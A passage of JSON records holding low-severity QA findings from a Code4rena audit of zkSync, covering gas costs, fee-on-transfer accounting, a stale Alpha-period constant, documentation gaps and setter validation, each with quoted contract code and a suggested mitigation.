      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33218",
      "title": "[26] zkEVM's `CodeOracle` Precompile somewhat deviates from EVM's `extcodecopy` behavior",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/precompiles/CodeOracle.yul#L4\n\n```yul\n * @notice The contract used to emulate EVM's `extcodecopy` behavior.\n\n```\n\nWe can see that this function is to emulate EVM extcodecopy behaviour, but it contatns multiple deviation to the etheruem's native implementation, to list a few:\n\n- **Memory Management:** `extcodecopy` allows specifying the destination memory location. `CodeOracle` relies on zkEVM's internal memory management, potentially reusing the same memory page for subsequent decommits, leading to caching issues.\n- **Functionality:** Unlike `extcodecopy` which copies a specific size of code, `CodeOracle` decommits the entire code based on a versioned hash stored in a separate contract.\n- **Error Handling:** `extcodecopy` handles out-of-gas situations during memory access. `CodeOracle` might not handle such cases, potentially leading to unexpected behavior.\n\n### Impact\n\nBorderline medium/low, since this is a deviation from Ethereum's specific implementation and would lead to confusion\n\n### Recommended Mitigation Steps\n\nConsider making it very similar to Ethereum's implementation or clearly document the deviation.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33217",
      "title": "[25] The `Ecrecover` gas cost been massively increased without significant increases in executional cost",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at the gas cost for ecrecover https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/precompiles/Ecrecover.yul#L22-L25\n\n```yul\n            /// @dev The gas cost of processing ecrecover circuit precompile.\n            function ECRECOVER_GAS_COST() -> ret {\n                ret := 7000\n            }\n```\n\nIt's been massively increased to more than `6x` it's former cost of `1112`, would be key to note that the execution of this contract is still the same without any execessive additional hashing/compiling that justifies this addition.\n\n### Impact\n\nUsers are now charged `>6x` the charges to `ECRECOVER` where as there are no real stand out addition in executional costs.\n\n### Recommended Mitigation Steps\n\nConsider reducing this cost or always attach extensive documentation whenever an update happens to a variable, especially the ones attached to costs.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33216",
      "title": "[24] `L1SharedBridge.sol` might encounter accounting errors",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at the new implementation of the Shared Bridge and how tokens are gotten from the legacy bridge, https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L115-L136\n\n```solidity\n    /// @dev tranfer tokens from legacy erc20 bridge or mailbox and set chainBalance as part of migration process\n    function transferFundsFromLegacy(address _token, address _target, uint256 _targetChainId) external onlyOwner {\n        if (_token == ETH_TOKEN_ADDRESS) {\n            uint256 balanceBefore = address(this).balance;\n            IMailbox(_target).transferEthToSharedBridge();\n            uint256 balanceAfter = address(this).balance;\n            require(balanceAfter > balanceBefore, \"ShB: 0 eth transferred\");\n            chainBalance[_targetChainId][ETH_TOKEN_ADDRESS] =\n                chainBalance[_targetChainId][ETH_TOKEN_ADDRESS] +\n                balanceAfter -\n                balanceBefore;\n        } else {\n            uint256 balanceBefore = IERC20(_token).balanceOf(address(this));\n            uint256 amount = IERC20(_token).balanceOf(address(legacyBridge));\n            require(amount > 0, \"ShB: 0 amount to transfer\");\n            IL1ERC20Bridge(_target).tranferTokenToSharedBridge(_token, amount);\n            uint256 balanceAfter = IERC20(_token).balanceOf(address(this));\n            require(balanceAfter - balanceBefore == amount, \"ShB: wrong amount transferred\");\n            chainBalance[_targetChainId][_token] = chainBalance[_targetChainId][_token] + amount;\n        }\n    }\n\n```\n\nNow this function calls https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1ERC20Bridge.sol#L63-L69\n\n```solidity\n    function tranferTokenToSharedBridge(address _token, uint256 _amount) external {\n        require(msg.sender == address(sharedBridge), \"Not shared bridge\");\n        uint256 amount = IERC20(_token).balanceOf(address(this));\n        require(amount == _amount, \"Incorrect amount\");\n        IERC20(_token).safeTransfer(address(sharedBridge), amount);\n    }\n\n```\n\nCase with this implementation is [the line](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L132)\n\n```solidity\n            require(balanceAfter - balanceBefore == amount, \"ShB: wrong amount transferred\");\n```\n\nThis automatically means that all fee on transfer tokens sre not supported, cause now while transfering the funds, as far as the fee is charged the difference between the former balance and the new balance is not going to be the same, and as such this attempt to transfer the funds would always revert, note that protocol can't also specify a lower amount to be sent due to the check that ensures the whole balance is sent.\n\nNow whereas protocol does not work currently with `FOT` tokens, there are tokens that exist that could have their implementations be update to support fees, effectively breaking protocol if that were to happen.\n\n### Impact\n\nFunds are potentially stuck in the ERC20 bridge, also core functionality is broken, being that `transferFundsFromLegacy()` won't work for these tokens.\n\n### Recommended Mitigation Steps\n\nIn as much as the aim of transfering these tokens from the ERC20 bridge is to clear the bridge of the tokens in it, then the finalization check could be changed from `balanceAfter - balanceBefore == amount` and instead implemented as a check that ensures that `IERC20(_token).balanceOf(address(legacyBridge)) == 0` after the transaction.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33215",
      "title": "[23] Redeployment considerations for `L2ContractHelper/Config.sol` in case of updates",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nSeveral functions and constants within `L2ContractHelper/Config.sol` are utilized by multiple Diamond facets across the smart contract system. Modifications to these shared elements necessitate Governor intervention to update all relevant facets. Non-compliance can lead to inconsistencies and potentially critical issues due to mismatched functionality across facets.\n\nA search using the following query confirms this concern:[https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync+L2ContractHelper.hashL2Bytecode&type=code](https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync+L2ContractHelper.hashL2Bytecode&type=code)\n\nThe search results demonstrate that the `hashL2Bytecode` function is employed within various facets, including `BaseZkSyncUpgrade.sol`, `Mailbox.sol`, `L1ERC20Bridge.sol`, and `L1EthBridge.sol`. Consequently, a change to `hashL2Bytecode` would necessitate redeploying all four of these facets.\n\n### Impact\n\nLow\n\n### Recommended Mitigation Steps\n\nTo eliminate the need for widespread redeployments upon updates to `L2ContractHelper` and `Config.sol`, we propose integrating them as Diamond facets themselves. This approach enables other facets to access the functions and constants through cross-facet calls, while external contracts can interact with them via the Diamond. With this structure, modifications only require redeploying and replacing the specific facet containing the updated elements.\n\nThis mitigation strategy streamlines the update process for shared functionalities, minimizing the need for extensive redeployment across multiple facets.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33214",
      "title": "[22] Alpha period code is still in production despite the period ending in April 2023",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/common/Config.sol#L35-L39\n\n```solidity\n/// @dev The amount of time in seconds the validator has to process the priority transaction\n/// NOTE: The constant is set to zero for the Alpha release period\n//@audit this is still 0?\nuint256 constant PRIORITY_EXPIRATION = 0 days;\n\n```\n\nEvidently, the PRIORITY_EXPIRATION is set to zero, but this is meant for the Alpha release period which ended in April, now consider https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Mailbox.sol#L258-L287\n\n```solidity\n    function _requestL2Transaction(\n        uint256 _mintValue,\n        WritePriorityOpParams memory _params,\n        bytes memory _calldata,\n        bytes[] memory _factoryDeps\n    ) internal returns (bytes32 canonicalTxHash) {\n        require(_factoryDeps.length <= MAX_NEW_FACTORY_DEPS, \"uj\");\n        _params.txId = s.priorityQueue.getTotalPriorityTxs();\n\n\n        // Checking that the user provided enough ether to pay for the transaction.\n        // Using a new scope to prevent \"stack too deep\" error\n\n\n        _params.l2GasPrice = _deriveL2GasPrice(tx.gasprice, _params.l2GasPricePerPubdata);\n        uint256 baseCost = _params.l2GasPrice * _params.l2GasLimit;\n        require(_mintValue >= baseCost + _params.l2Value, \"mv\"); // The `msg.value` doesn't cover the transaction cost\n\n\n        // If the `_refundRecipient` is not provided, we use the `_sender` as the recipient.\n        address refundRecipient = _params.refundRecipient == address(0) ? _params.sender : _params.refundRecipient;\n        // If the `_refundRecipient` is a smart contract, we apply the L1 to L2 alias to prevent foot guns.\n        if (refundRecipient.code.length > 0) {\n            refundRecipient = AddressAliasHelper.applyL1ToL2Alias(refundRecipient);\n        }\n        _params.refundRecipient = refundRecipient;\n\n\n        // populate missing fields\n        //@audit\n        _params.expirationTimestamp = uint64(block.timestamp + PRIORITY_EXPIRATION); // Safe to cast\n        _params.valueToMint = _mintValue;\n\n\n        canonicalTxHash = _writePriorityOp(_params, _calldata, _factoryDeps);\n    }\n```\n\nWe can see that the deadline parameter uses this value \"PRIORITY_EXPIRATION\" to determine the deadline for the validators to process this transaction, but the value being 0 would mean that all transaction would use the timestamp the transaction was requested, which would be logically flawed.\n\n### Impact\n\nOutdated code still in production.\n\n### Recommended Mitigation Steps\n\nSince the Alpha release period has passed, the necessary value for `PRIORITY_EXPIRATION`should be passed and stored in `Config.sol`\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33213",
      "title": "[21] Remove unnecessary code irrelevant to final production",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/DiamondInit.sol#L51\n\n```solidity\n        // While this does not provide a protection in the production, it is needed for local testing\n        // Length of the L2Log encoding should not be equal to the length of other L2Logs' tree nodes preimages\n        assert(L2_TO_L1_LOG_SERIALIZE_SIZE != 2 * 32);\n```\n\nThis check is used to ensure that the length of the L2Log encoding is not equal to the length of other L2Logs' tree nodes preimages, but according to the code comment, we know that the check is only in place for testing purposes, also from [here](https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/common/Config.sol#L8-L12) we can see that this is a constant value set as `88`.\n\n### Impact\n\nBad code structure, unnecessary code irrelevant to the production is being left in protocol.\n\n### Recommended Mitigation Steps\n\nRemove this assertion from final released code.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33212",
      "title": "[20] Deviation from Solidity best styling practices in scoped contracts",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nMultiple instances of going against the best styling practices one of such can be seen in Executor.sol\n\nTake a look athttps://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/chain-deps/facets/Executor.sol#L6\n\n```solidity\nimport {COMMIT_TIMESTAMP_NOT_OLDER, COMMIT_TIMESTAMP_APPROXIMATION_DELTA, EMPTY_STRING_KECCAK, L2_TO_L1_LOG_SERIALIZE_SIZE, MAX_L2_TO_L1_LOGS_COMMITMENT_BYTES, PACKED_L2_BLOCK_TIMESTAMP_MASK, PUBLIC_INPUT_SHIFT, POINT_EVALUATION_PRECOMPILE_ADDR} from \"../../../common/Config.sol\";\n```\n\nCovers the whole screen which should instead include a line break for better readability.\n\n### Impact\n\nDifficulties while reading through code.\n\n### Recommended Mitigation Steps\n\nFollow best styling practices.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33211",
      "title": "[19] Multiple instances of where messages within `require` are not descriptive",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nThis is fairly rampant in code, taking the `Admin.sol` as the primary case to prove this bug.\nTake a look at these instances:\n\n```solidity\n        require(msg.sender == pendingAdmin, \"n4\"); // Only proposed by current admin address can claim the admin rights\n\n\n        require(_newPriorityTxMaxGasLimit <= MAX_GAS_PER_TRANSACTION, \"n5\");\n\n\n        require(_newFeeParams.maxPubdataPerBatch >= _newFeeParams.priorityTxMaxPubdata, \"n6\");\n\n\n        require(!diamondStorage.isFrozen, \"a9\"); // diamond proxy is frozen already\n\n\n```\n\nOther instances can be scoped out by using this search keyword: [https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync+require%28+NOT+language%3ATypeScript+NOT+language%3AMarkdown&type=code](https://github.com/search?q=repo%3Acode-423n4%2F2024-03-zksync+require%28+NOT+language%3ATypeScript+NOT+language%3AMarkdown&type=code)\n\n### Impact\n\nWhere as some instances have the errored out cases commented out it still does not provide a descriptive case for the `require()` and as such this causes lack of understanding of protocol.\n\n### Recommended Mitigation Steps\n\nConsider adding descriptive messages after each `require()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33210",
      "title": "[18] Setters do not have `equality/zero` checkers",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nThere are multiple instances where protocol does not validate input data, to list a few, take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/governance/Governance.sol#L248-L260\n\n```solidity\n    /// @dev Changes the minimum timelock duration for future operations.\n    /// @param _newDelay The new minimum delay time (in seconds) for future operations.\n    function updateDelay(uint256 _newDelay) external onlySelf {\n        emit ChangeMinDelay(minDelay, _newDelay);\n        minDelay = _newDelay;\n    }\n\n    /// @dev Updates the address of the security council.\n    /// @param _newSecurityCouncil The address of the new security council.\n    function updateSecurityCouncil(address _newSecurityCouncil) external onlySelf {\n        emit ChangeSecurityCouncil(securityCouncil, _newSecurityCouncil);\n        securityCouncil = _newSecurityCouncil;\n    }\n```\n\nEvidently, these functions are used for updating governance values, but no checks exist on making sure that the values being passed are not the same as the stored value for these variables.\n\n- Another instance can be seen here: https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/system-contracts/contracts/ContractDeployer.sol#L62-L70\n\n```solidity\n    /// @notice Update the used version of the account.\n    /// @param _version The new version of the AA protocol to use.\n    /// @dev Note that it allows changes from account to non-account and vice versa.\n    function updateAccountVersion(AccountAbstractionVersion _version) external onlySystemCall {\n        accountInfo[msg.sender].supportedAAVersion = _version;\n\n        emit AccountVersionUpdated(msg.sender, _version);\n    }\n\n```\n\nAs we can see, there's no verification that`_version` is different from `accountInfo[msg.sender].supportedAAVersion` or not being `0`\n\n\n### Impact\n\nNo input validation in this case leading to an unnecessary execution of code if the value is the same, or even if it's zero.\n\n### Recommended Mitigation Steps\n\nImplement equality checkers in setter functions.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33209",
      "title": "[17] New instances of missing natspec comments",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nMultiple instances of this\n\n- Take a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L527-L605\n\n```solidity\n    /*//////////////////////////////////////////////////////////////\n                            ERA LEGACY FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Initiates a deposit by locking funds on the contract and sending the request\n    /// of processing an L2 transaction where tokens would be minted.\n    /// @dev If the token is bridged for the first time, the L2 token contract will be deployed. Note however, that the\n    /// newly-deployed token does not support any custom logic, i.e. rebase tokens' functionality is not supported.\n    /// @param _l2Receiver The account address that should receive funds on L2\n    /// @param _l1Token The L1 token address which is deposited\n    /// @param _amount The total amount of tokens to be bridged\n    /// @param _l2TxGasLimit The L2 gas limit to be used in the corresponding L2 transaction\n    /// @param _l2TxGasPerPubdataByte The gasPerPubdataByteLimit to be used in the corresponding L2 transaction\n    /// @param _refundRecipient The address on L2 that will receive the refund for the transaction.\n    /// @dev If the L2 deposit finalization transaction fails, the `_refundRecipient` will receive the `_l2Value`.\n    /// Please note, the contract may change the refund recipient's address to eliminate sending funds to addresses\n    /// out of control.\n    /// - If `_refundRecipient` is a contract on L1, the refund will be sent to the aliased `_refundRecipient`.\n    /// - If `_refundRecipient` is set to `address(0)` and the sender has NO deployed bytecode on L1, the refund will\n    /// be sent to the `msg.sender` address.\n    /// - If `_refundRecipient` is set to `address(0)` and the sender has deployed bytecode on L1, the refund will be\n    /// sent to the aliased `msg.sender` address.\n    /// @dev The address aliasing of L1 contracts as refund recipient on L2 is necessary to guarantee that the funds\n    /// are controllable through the Mailbox, since the Mailbox applies address aliasing to the from address for the\n    /// L2 tx if the L1 msg.sender is a contract. Without address aliasing for L1 contracts as refund recipients they\n    /// would not be able to make proper L2 tx requests through the Mailbox to use or withdraw the funds from L2, and\n    /// the funds would be lost.\n    /// @return l2TxHash The L2 transaction hash of deposit finalization.\n    function depositLegacyErc20Bridge(\n        address _prevMsgSender,\n        address _l2Receiver,\n        address _l1Token,\n        uint256 _amount,\n        uint256 _l2TxGasLimit,\n        uint256 _l2TxGasPerPubdataByte,\n        address _refundRecipient\n    ) external payable override onlyLegacyBridge nonReentrant returns (bytes32 l2TxHash) {\n        require(l2BridgeAddress[ERA_CHAIN_ID] != address(0), \"ShB b. n dep\");\n        require(_l1Token != l1WethAddress, \"ShB: WETH deposit not supported 2\");\n\n        // Note that funds have been transferred to this contract in the legacy ERC20 bridge.\n        if (!hyperbridgingEnabled[ERA_CHAIN_ID]) {\n            chainBalance[ERA_CHAIN_ID][_l1Token] += _amount;\n        }\n\n        bytes memory l2TxCalldata = _getDepositL2Calldata(_prevMsgSender, _l2Receiver, _l1Token, _amount);\n\n        {\n            // If the refund recipient is not specified, the refund will be sent to the sender of the transaction.\n            // Otherwise, the refund will be sent to the specified address.\n            // If the recipient is a contract on L1, the address alias will be applied.\n            address refundRecipient = _refundRecipient;\n            if (_refundRecipient == address(0)) {\n                refundRecipient = _prevMsgSender != tx.origin\n                    ? AddressAliasHelper.applyL1ToL2Alias(_prevMsgSender)\n                    : _prevMsgSender;\n            }\n\n            L2TransactionRequestDirect memory request = L2TransactionRequestDirect({\n                chainId: ERA_CHAIN_ID,\n                l2Contract: l2BridgeAddress[ERA_CHAIN_ID],\n                mintValue: msg.value, // l2 gas + l2 msg.Value the bridgehub will withdraw the mintValue from the base token bridge for gas\n                l2Value: 0, // L2 msg.value, this contract doesn't support base token deposits or wrapping functionality, for direct deposits use bridgehub\n                l2Calldata: l2TxCalldata,\n                l2GasLimit: _l2TxGasLimit,\n                l2GasPerPubdataByteLimit: _l2TxGasPerPubdataByte,\n                factoryDeps: new bytes[](0),\n                refundRecipient: refundRecipient\n            });\n            l2TxHash = bridgehub.requestL2TransactionDirect{value: msg.value}(request);\n        }\n\n        bytes32 txDataHash = keccak256(abi.encode(_prevMsgSender, _l1Token, _amount));\n        // Save the deposited amount to claim funds on L1 if the deposit failed on L2\n        depositHappened[ERA_CHAIN_ID][l2TxHash] = txDataHash;\n\n        emit LegacyDepositInitiated(ERA_CHAIN_ID, l2TxHash, _prevMsgSender, _l2Receiver, _l1Token, _amount);\n    }\n\n```\n\nEvidently we can see that for the @param `_prevMsgSender` nothing is being explained.\n\n- Another instance to look at would be this https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L146-L170\n\n```solidity\n    /// @notice Allows bridgehub to acquire mintValue for L1->L2 transactions.\n    /// @dev If the corresponding L2 transaction fails, refunds are issued to a refund recipient on L2.\n    function bridgehubDepositBaseToken(\n        uint256 _chainId,\n        address _prevMsgSender,\n        address _l1Token,\n        uint256 _amount\n    ) external payable virtual onlyBridgehubOrEra(_chainId) {\n        if (_l1Token == ETH_TOKEN_ADDRESS) {\n            require(msg.value == _amount, \"L1SharedBridge: msg.value not equal to amount\");\n        } else {\n            // The Bridgehub also checks this, but we want to be sure\n            require(msg.value == 0, \"ShB m.v > 0 b d.it\");\n\n            uint256 amount = _depositFunds(_prevMsgSender, IERC20(_l1Token), _amount); // note if _prevMsgSender is this contract, this will return 0. This does not happen.\n            require(amount == _amount, \"3T\"); // The token has non-standard transfer logic\n        }\n\n        if (!hyperbridgingEnabled[_chainId]) {\n            chainBalance[_chainId][_l1Token] += _amount;\n        }\n        // Note that we don't save the deposited amount, as this is for the base token, which gets sent to the refundRecipient if the tx fails\n        emit BridgehubDepositBaseTokenInitiated(_chainId, _prevMsgSender, _l1Token, _amount);\n    }\n\n```\n\nThe `onlyBridgehubOrEra` modifier has been used and as such the documentation should entail that it \"Allows bridgehub **or era** to acquire mintValue for L1->L2 \"transactions.\n\n- Another one to consider would be https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/bridge/L1SharedBridge.sol#L488-L527\n\n```solidity\n    function _parseL2WithdrawalMessage(\n        uint256 _chainId,\n        bytes memory _l2ToL1message\n    ) internal view returns (address l1Receiver, address l1Token, uint256 amount) {\n        // We check that the message is long enough to read the data.\n        // Please note that there are two versions of the message:\n        // 1. The message that is sent by `withdraw(address _l1Receiver)`\n        // It should be equal to the length of the bytes4 function signature + address l1Receiver + uint256 amount = 4 + 20 + 32 = 56 (bytes).\n        // 2. The message that is sent by `withdrawWithMessage(address _l1Receiver, bytes calldata _additionalData)`\n        // It should be equal to the length of the following:\n        //@audit\n        // bytes4 function signature + address l1Receiver + uint256 amount + address l2Sender + bytes _additionalData =\n        // = 4 + 20 + 32 + 32 + _additionalData.length >= 68 (bytes).\n\n        // So the data is expected to be at least 56 bytes long.\n        require(_l2ToL1message.length >= 56, \"ShB wrong msg len\"); // wrong messsage length\n\n        (uint32 functionSignature, uint256 offset) = UnsafeBytes.readUint32(_l2ToL1message, 0);\n        if (bytes4(functionSignature) == IMailbox.finalizeEthWithdrawal.selector) {\n            // this message is a base token withdrawal\n            (l1Receiver, offset) = UnsafeBytes.readAddress(_l2ToL1message, offset);\n            (amount, offset) = UnsafeBytes.readUint256(_l2ToL1message, offset);\n            l1Token = bridgehub.baseToken(_chainId);\n        } else if (bytes4(functionSignature) == IL1ERC20Bridge.finalizeWithdrawal.selector) {\n            // We use the IL1ERC20Bridge for backward compatibility with old withdrawals.\n\n            // this message is a token withdrawal\n\n            // Check that the message length is correct.\n            // It should be equal to the length of the function signature + address + address + uint256 = 4 + 20 + 20 + 32 =\n            // 76 (bytes).\n            require(_l2ToL1message.length == 76, \"ShB wrong msg len 2\");\n            (l1Receiver, offset) = UnsafeBytes.readAddress(_l2ToL1message, offset);\n            (l1Token, offset) = UnsafeBytes.readAddress(_l2ToL1message, offset);\n            (amount, offset) = UnsafeBytes.readUint256(_l2ToL1message, offset);\n        } else {\n            revert(\"ShB Incorrect message function selector\");\n        }\n    }\n```\n\nEvidently, in this case, we can see that the math around `// bytes4 function signature + address l1Receiver + uint256 amount + address l2Sender + bytes _additionalData =  // = 4 + 20 + 32 + 32 + _additionalData.length >= 68 (bytes).` is wrong and `68` in this case should be `88` instead.\n\n### Impact\n\nIncomplete code documentation, makes it harder to understand code\n\n### Recommended Mitigation Steps\n\nApply all suffiecient natspec explanations where necessary.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33208",
      "title": "[16] The placeholder `_postUpgrade()` has no implementation and is not meant to be used but is being queried twice via both the genesis and normal upgrade pattern",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L265-L269\n\n```solidity\n    /// @notice placeholder function for custom logic for post-upgrade logic.\n    /// Typically this function will never be used.\n    /// @param _customCallDataForUpgrade Custom data for an upgrade, which may be interpreted differently for each\n    /// upgrade.\n    function _postUpgrade(bytes calldata _customCallDataForUpgrade) internal virtual {}\n```\n\nEvidently, we can see that this function is not to be used as it currently has no implementation and an empty block, but it's being queried twice via both the genesis and normal upgrade pattern consider these 2 instances, 1- https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgradeGenesis.sol#L65-L66, & 2 - https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/upgrades/BaseZkSyncUpgrade.sol#L85-L86\n\nNow would be key to note that where as the `postUpgradeCalldata` would usually be empty it's not always the case and is actually the custom calldata for post upgrade hook which would be interpreted differently dependent on the upgrade\n\n### Impact\n\nInability to implement any post upgrade calldata whenever `postUpgradeCalldata` is empty as the `_postUpgrade()` function lacks an implementation.\n\n> Submitting as QA due to the \"Typically this function will never be used\" comment\n\n### Recommended Mitigation Steps\n\nIntroduce a functionality to implement a post upgrade custom call data, as suggested by the docs, this should be via an implementation of `_postUpgrade()`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2024-03-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "33207",
      "title": "[15] upgrades are automatically immediately possible instead of being able to have a kick in time in the future",
      "impact": "LOW",
      "content": "\n### Proof of Concept\n\nTake a look at https://github.com/code-423n4/2024-03-zksync/blob/4f0ba34f34a864c354c7e8c47643ed8f4a250e13/code/contracts/ethereum/contracts/state-transition/StateTransitionManager.sol#L177-L228\n\n```solidity\n    function _setChainIdUpgrade(uint256 _chainId, address _chainContract) internal {\n        bytes memory systemContextCalldata = abi.encodeCall(ISystemContext.setChainId, (_chainId));\n        uint256[] memory uintEmptyArray;\n        bytes[] memory bytesEmptyArray;\n\n        L2CanonicalTransaction memory l2ProtocolUpgradeTx = L2CanonicalTransaction({\n            txType: SYSTEM_UPGRADE_L2_TX_TYPE,\n            from: uint256(uint160(L2_FORCE_DEPLOYER_ADDR)),\n            to: uint256(uint160(L2_SYSTEM_CONTEXT_SYSTEM_CONTRACT_ADDR)),\n            gasLimit: $(PRIORITY_TX_MAX_GAS_LIMIT),\n            gasPerPubdataByteLimit: REQUIRED_L2_GAS_PRICE_PER_PUBDATA,\n            maxFeePerGas: uint256(0),\n            maxPriorityFeePerGas: uint256(0),\n            paymaster: uint256(0),\n            // Note, that the priority operation id is used as \"nonce\" for L1->L2 transactions\n            nonce: protocolVersion,\n            value: 0,\n            reserved: [uint256(0), 0, 0, 0],\n            data: systemContextCalldata,\n            signature: new bytes(0),\n            factoryDeps: uintEmptyArray,\n            paymasterInput: new bytes(0),\n            reservedDynamic: new bytes(0)\n        });\n\n        ProposedUpgrade memory proposedUpgrade = ProposedUpgrade({\n            l2ProtocolUpgradeTx: l2ProtocolUpgradeTx,\n            factoryDeps: bytesEmptyArray,\n            bootloaderHash: bytes32(0),\n            defaultAccountHash: bytes32(0),\n            verifier: address(0),\n            verifierParams: VerifierParams({\n                recursionNodeLevelVkHash: bytes32(0),\n                recursionLeafLevelVkHash: bytes32(0),\n                recursionCircuitsSetVksHash: bytes32(0)\n            }),\n            l1ContractsUpgradeCalldata: new bytes(0),\n            postUpgradeCalldata: new bytes(0),\n            upgradeTimestamp: 0,\n            newProtocolVersion: protocolVersion\n        });\n\n        Diamond.FacetCut[] memory emptyArray;\n        Diamond.DiamondCutData memory cutData = Diamond.DiamondCutData({\n            facetCuts: emptyArray,\n            initAddress: genesisUpgrade,\n            initCalldata: abi.encodeCall(IDefaultUpgrade.upgrade, 